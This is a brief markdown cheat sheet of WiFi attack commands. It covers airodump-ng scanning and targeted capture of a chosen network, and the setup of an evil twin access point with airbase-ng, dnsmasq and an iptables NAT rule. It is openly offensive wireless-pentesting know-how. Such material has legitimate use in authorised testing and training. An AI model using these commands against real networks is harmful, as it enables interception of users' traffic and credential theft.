## WiFi Attack Techniques

### Initial Reconnaissance
* Basic WiFi scanning
        * `airodump-ng wlan0mon`
* Target-specific monitoring
        * `airodump-ng -w capture -c [channel] --bssid [BSSID] wlan0mon`
* Client detection
        * `airodump-ng --manufacturer --uptime wlan0mon`

### Evil Twin Attack Setup
* Create fake AP
        * `airbase-ng -e "[SSID]" -c [channel] wlan0mon`
* Configure DHCP
        * `dnsmasq -C dnsmasq.conf -d`
* Route traffic
        * `iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE`